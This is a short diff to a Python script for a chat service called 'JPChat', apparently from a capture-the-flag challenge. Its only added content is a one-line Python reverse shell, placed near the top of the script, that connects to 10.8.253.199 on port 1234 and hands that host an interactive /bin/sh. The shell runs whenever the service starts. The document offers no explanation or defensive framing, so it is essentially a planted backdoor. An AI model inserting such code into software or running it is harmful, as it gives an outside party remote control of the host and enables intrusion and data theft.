@@ -5,6 +5,8 @@ import os
 print ('Welcome to JPChat')
 print ('the source code of this service can be found at our admin\'s github')
 
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.253.199",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+
 def report_form():
 
 	print ('this report will be read by Mozzie-jpg')
